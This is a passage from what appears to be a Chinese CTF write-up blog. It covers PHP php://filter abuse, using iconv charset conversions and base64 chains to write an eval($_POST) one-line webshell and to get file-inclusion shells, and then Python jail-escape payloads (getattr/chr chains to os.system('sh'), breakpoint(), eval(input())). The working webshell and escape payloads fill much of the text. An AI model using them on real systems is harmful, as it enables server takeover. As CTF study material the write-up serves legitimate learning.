<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment"># ?&lt;hp phpipfn(o;)&gt;? 从转换结果就可以看出来是如何转换的，为什么要是2的倍数 同时注意包裹要转换的字符串必须是单引号</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span> <span class="comment">#一句话木马</span></span><br><span class="line"><span class="comment">#?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?</span></span><br></pre></td></tr></table></figure>

<p>payload(其实都差不多了感觉):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>最后效果：</p>
<p>成功写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201457636.png" alt="image-20240522201457636"></p>
<p>成功利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201556443.png" alt="image-20240522201556443"></p>
<ul>
<li><strong>usc-4</strong></li>
</ul>
<p>这个和上面那个差不多的，只不过这个是对目标字符串进行4位以反转(这里的4LE和4BE可以看作是小端和大端的列子），也就是说目标字符串的字节需要为4的倍数，简单说说：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-4LE&quot;</span>,<span class="string">&quot;UCS-4BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>最终效果：</p>
<p>写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202744151.png" alt="image-20240522202744151"></p>
<p>利用：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202830720.png" alt="image-20240522202830720"></p>
<ul>
<li>utf8-utf7</li>
</ul>
<p>这个方法就与上面两个不同了，由于utf-8与utf-7在编码转换时只对符号进行编码，不对字符编码。如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#+ADw?php +AEA-eval(+ACQAXw-POST+AFs-x12+AF0)+ADs ?+AD4-   可以看出字符都被留下来了，并且在像上面方法那样利用转换并不能成功，可以自己试试</span></span><br></pre></td></tr></table></figure>

<p>但是注意这个：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"><span class="comment">#+AD0- 并且刚好是四个字节，可以被base64解码掉</span></span><br></pre></td></tr></table></figure>

<p>这个编码把<code>=</code>给过滤了，这时候就可以想到结合上面将的Base64编码使用，</p>
<p>这是就要注意到之间说过的4个为一个单位来将前面的<code>phpexit</code>去掉，但是这里不一样，需要将传入的字符前面所有都为四个字节为一组，先看简单构造出来的payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=XXXPD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+  ： &lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时我们就需要想如何使得前面的能够为4个一组，操作点就在<code>XXX</code>那里，写一个php代码看看前面的在过滤后还剩什么：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;&lt;?php exit;php://filter/write=&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$ga</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ga</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">+ADw?php <span class="keyword">exit</span>+ADs-php:<span class="comment">//filter/write+AD0-</span></span><br><span class="line"></span><br><span class="line">+ADwphpexit+ADsphp<span class="comment">//filter/write+AD0</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#第二个字符串就是我们最终会被base64解码的字符串，这里刚好有36个字节，所以不用往前面加东西-即不用加X</span></span><br></pre></td></tr></table></figure>

<p>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522212950464.png" alt="image-20240522212950464"></p>
<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522213035987.png" alt="image-20240522213035987"></p>
<p>参考文章：</p>
<p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p>
<p><code>https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</code></p>
<p><code>https://blog.csdn.net/woshilnp/article/details/117266628</code></p>
<h3 id="利用filter-chain生成任意字符"><a href="#利用filter-chain生成任意字符" class="headerlink" title="利用filter chain生成任意字符"></a>利用filter chain生成任意字符</h3><p>所以这里就利用了filter链的构造，详细看这个项目：</p>
<p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
<p>当然也有可以直接用来梭的脚本：</p>
<p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
<h5 id="php-temp"><a href="#php-temp" class="headerlink" title="php:&#x2F;&#x2F;temp"></a>php:&#x2F;&#x2F;temp</h5><p>这里说明一个知识点，temp和memory伪协议</p>
<p><code>php://memory</code>和<code>php://temp</code>是一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是<code>php://memory</code>总是把数据储存在内存中，而<code>php://temp</code>的内存限制可通过田间<code>/maxmemory:NN</code>来控制，NN是以字节为单位、保留在内存的最大数据量，超过则使用临时文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fiveMBs</span> = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>;  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://temp/maxmemory:<span class="subst">$fiveMBs</span>&quot;</span>, <span class="string">&#x27;r+&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="string">&quot;hello\n&quot;</span>);  </span><br><span class="line"><span class="comment">// 读取写入的数据.  </span></span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>

<p><code>php://memory</code>和<code>php://temp</code>是一次性的，比如：当stream流关闭后，就无法再次得到以前的内容了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;PHP&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>); <span class="comment">// 啥也没有</span></span><br></pre></td></tr></table></figure>

<h5 id="如何构造"><a href="#如何构造" class="headerlink" title="如何构造"></a>如何构造</h5><p>由于PHP Filter的存在，我们可以利用一些操作来构造自己想要的内容。正好PHP Filter当中有一种<code>convert.iconv</code>的Filter，可以用来将数据从字符集A转换为字符集B。</p>
<p>举个简单的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;php://filter/convert.iconv.UTF-8/UTF-7/resource=data://,some&lt;&gt;text&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// some+ADwAPg-text 同时这里的data:,其实就是data伪协议，只是这里没有指定媒体类型，默认为text/plain;charset=US-ASCII，故只有后面的some&lt;&gt;text被转换了。</span></span><br></pre></td></tr></table></figure>

<p>那么如何利用呢？</p>
<p><strong>这里先说明一个技巧：</strong>当我们使用其他字符编码产生了不可见字符，并且对于PHP Base来说是非法字符（比如：$)C），那么此时我们只需要base64-decoded一下就可以去掉不可见字符了，但是与此同时，我们的C字符也也被 base64-decode解码了，这时候需要再把解码结果使用一次base64-encode即可还原回来原来的C字符，这样就可以留下我们想要的字符了。</p>
<p>比如我们现在想要构造尖括号，因为base64编码合法字符里没有尖括号，所以不能直接产生PHP代码进行包含，但是可以通过上面的那个技巧来产生一个Base64字符串，最后再使用一次base64解码就可以产生了</p>
<p>比如我们可以通过生成<code>PAaaaaa</code>，最后再经过Base64解码得到的字符为<code>&lt;</code>，后续为其他不需要的垃圾字符串。所以接下来需要做的，就是利用上面的技巧找到这么一类编码，可以只存在我们需要构造的一个webshell的base64字符串了。</p>
<p>大概就是这个意思，直接看题，具体构造直接看下面的参考文章。</p>
<h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>下面都是直接利用的这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
<h6 id="用于文件包含"><a href="#用于文件包含" class="headerlink" title="用于文件包含"></a>用于文件包含</h6><p><strong>通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</strong>，比如XYCTF的题</p>
<p><strong>ezLFI</strong></p>
<p>题目描述：一句话木马？<br>——————</p>
<p>有附件，可以知道index.php的内容为<code>&lt;?php include_once($_REQUEST[&#39;file&#39;]);</code>，waf了很多，这里可以通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</p>
<p>项目地址：<code>https://github.com/synacktiv/php_filter_chain_generator</code>，直接利用这个脚本生成</p>
<p>如下：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152334913.png" alt="image-20240527152334913"></p>
<p>成功得到flag</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152405691.png" alt="image-20240527152405691"></p>
<p><strong>这里可以利用的原因</strong>就在于<code>php://temp</code>，经过一系列过滤器处理后的数据被传递给了<code>php://temp</code>流，这意味着最终的数据被写入了一个临时文件中。这个临时文件中包含了经过处理的数据，由此可以用于文件包含。</p>
<h6 id="用于构造任意字符串"><a href="#用于构造任意字符串" class="headerlink" title="用于构造任意字符串"></a>用于构造任意字符串</h6><p>其实本质和上面那个差不多，这里记录一下做法而已，对于为什么会在前面构造出想要的字符串，看参考文章。</p>
<p><strong>连连看到底是连连什么看</strong></p>
<p>题目描述：到底连连什么看才对呢？（flag在根目录&#x2F;flag下）</p>
<p>——————</p>
<p>开题就是一个小游戏，查看源码看到如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154205080.png" alt="image-20240527154205080"></p>
<p>直接尝试文件包含<code>?file=/flag</code>,显示：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154253580.png" alt="image-20240527154253580"></p>
<p>直接跳转到这个文件，得到php代码，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时就需要借鉴这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
<p>这里我们并不能保证<code>/etc/passwd</code>内容为想要的<code>XYCTF</code>，而且一般都不是，考点不会这么简单，这里估计想考的就是利用filter chain构造任意字符串，如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154613313.png" alt="image-20240527154613313"></p>
<p>我们本地看看结果是什么</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174205087.png" alt="image-20240527174205087"></p>
<p>可以看到确实成功构造出来了<code>XYCTF</code>，但是由于这里有垃圾数据，就需要用到上面说过的<code>string.strip_tags</code>来过滤掉垃圾数据，如下构造</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174836426.png" alt="image-20240527174836426"></p>
<p>最终效果</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174418038.png" alt="image-20240527174418038"></p>
<p>再传入题目中：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174628296.png" alt="image-20240527174628296"></p>
<p>得到flag</p>
<p>参考文章：</p>
<p><code>https://tttang.com/archive/1395/</code></p>
<p><code>https://probiusofficial.github.io/2023/02/07/Filter/#php-x2F-x2F-filter</code></p>
<p><code>https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0</code></p>
]]></content>
      <categories>
        <category>php相关漏洞</category>
        <category>对php的filter过滤器利用总结</category>
      </categories>
  </entry>
  <entry>
    <title>沙箱逃逸做题总结</title>
    <url>/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>持续更新中</p>
<span id="more"></span>

<h3 id="calc-jail-beginner-JAIL"><a href="#calc-jail-beginner-JAIL" class="headerlink" title="calc_jail_beginner(JAIL)"></a>calc_jail_beginner(JAIL)</h3><p>无过滤</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601191148423.png" alt="image-20240601191148423"></p>
<h3 id="calc-jail-beginner-level1-JAIL"><a href="#calc-jail-beginner-level1-JAIL" class="headerlink" title="calc_jail_beginner_level1(JAIL)"></a>calc_jail_beginner_level1(JAIL)</h3><p>题目给了源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`ib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">  ...  </span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>

<p>过滤了字符 <code>&quot;</code>， <code>&#39;</code>， <code> 反引号</code>， <code>i</code>， <code>b</code>这几个字符串，可以使用ssti，但是这里过滤了i和b字符和引号，在翻看笔记的过程中，发现了一个<code>getattr</code>函数，先看一看笔记：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>其实就是获取a的属性b，<strong>可以用于继承链</strong>，如下：</p>
<p>但是这里过滤了引号，使用<code>chr()</code>函数（对应ascii），可以用脚本生成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chr_converter</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(<span class="string">f&#x27;chr(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>)&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">input_str = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(chr_converter(input_str))</span><br></pre></td></tr></table></figure>

<p>最终如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(().__class__.__mro__[<span class="number">1</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601204517815.png" alt="image-20240601204517815"></p>
<p>成功执行，可以知道os模块为倒数第四个，那么由于不能直接将chr()用于继承链（会报错），所以需要套，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(().__class__.__mro__[<span class="number">1</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()[-<span class="number">4</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))</span><br><span class="line"><span class="comment">#__init__</span></span><br></pre></td></tr></table></figure>

<p>成功：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601204922973.png" alt="image-20240601204922973"></p>
<p>这样套就行，最终想要使用的payload为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>构造出来如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(<span class="built_in">getattr</span>(().__class__.__mro__[<span class="number">1</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()[-<span class="number">4</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)),<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">103</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))[<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">121</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)](<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">104</span>))</span><br></pre></td></tr></table></figure>

<p>最终效果：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601205811054.png" alt="image-20240601205811054"></p>
<p>得到flag。</p>
<h3 id="calc-jail-beginner-level2-JAIL"><a href="#calc-jail-beginner-level2-JAIL" class="headerlink" title="calc_jail_beginner_level2(JAIL)"></a>calc_jail_beginner_level2(JAIL)</h3><p>关键源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>

<p>就是限制长度小于13</p>
<p>可以直接使用<code>breakpoint()</code>，如下：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601210703788.png" alt="image-20240601210703788"></p>
<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;02f51feb-0822-4684-afac-cffdcffa71d4&#125;</span><br></pre></td></tr></table></figure>

<p>（不知道为啥help()最后getshell那里出不了。？？）</p>
<p>**还可以传入<code>eval(input())</code>**，然后再输入任意代码可以执行，这样可以绕过任何防护。</p>
<h3 id="calc-jail-beginner-level3-JAIL"><a href="#calc-jail-beginner-level3-JAIL" class="headerlink" title="calc_jail_beginner_level3(JAIL)"></a>calc_jail_beginner_level3(JAIL)</h3><p>关键源码：</p>
